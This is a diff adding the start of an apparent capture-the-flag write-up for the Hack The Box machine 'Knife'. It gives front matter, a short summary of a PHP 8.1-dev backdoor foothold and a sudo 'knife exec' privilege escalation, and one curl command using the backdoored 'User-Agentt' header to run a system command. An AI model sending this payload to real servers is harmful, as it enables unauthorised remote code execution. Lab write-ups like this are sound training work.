@@ -1,0 +1,18 @@
+---
+title: "HTB — Knife (Easy)"
+date: 2025-09-01
+summary: "Foothold via PHP 8.1-dev backdoor, privesc with sudo knife exec."
+platform: HTB
+difficulty: Easy
+tags: [web, rce, privesc, sudo]
+repo: "https://github.com/yourname/knife-notes"
+---
+
+
+## TL;DR
+- Enumerate → find PHP 8.1-dev backdoor header → RCE.
+- Reuse `knife exec` with sudo misconfig → root.
+
+
+```bash
+curl -H "User-Agentt: zerodiumsystem('id');" http://target
